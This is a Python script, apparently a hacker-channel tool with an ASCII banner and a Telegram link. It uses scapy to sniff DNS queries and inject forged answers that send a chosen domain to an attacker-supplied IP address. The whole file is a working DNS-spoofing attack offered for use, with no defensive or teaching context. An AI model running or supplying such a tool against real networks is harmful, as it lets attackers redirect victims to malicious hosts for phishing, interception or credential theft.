from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
import dns.resolver
import sys
import time

def type_effect(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.05)
    print("")

def get_spoofed_ip(domain):
    try:
        answer = dns.resolver.resolve(domain, 'A')
        return str(answer[0])
    except Exception as e:
        print(f"Error resolving domain: {e}")
        return None

def dns_spoof(pkt, spoofed_domain, spoofed_ip):
    if pkt.haslayer(DNSQR):
        if pkt[DNSQR].qname.decode('utf-8') == spoofed_domain:
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
                              an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=spoofed_ip))
            send(spoofed_pkt, verbose=0)

def start_dns_spoofing(spoofed_domain, spoofed_ip):
    sniff(filter="udp and port 53", prn=lambda pkt: dns_spoof(pkt, spoofed_domain, spoofed_ip))

print("\033[1;36m")
print(r"""
 ,    _
       /|   | |
     _/_\_  >_<
    .-\-/.   |
   /  | | \_ |
   \ \| |\__(/
   /(`---')  |
  / /     \  |
._.'  \'-'  /  |
`----'`=-='   '    t.me/VikingTERMINAL
""")
print("\033[0m")
time.sleep(2)

type_effect("\033[1;31mEnter the spoofed domain name: \033[0m")
spoofed_domain = input()
type_effect("\033[1;31mEnter the corresponding IP address: \033[0m")
spoofed_ip = input()

start_dns_spoofing(spoofed_domain, spoofed_ip)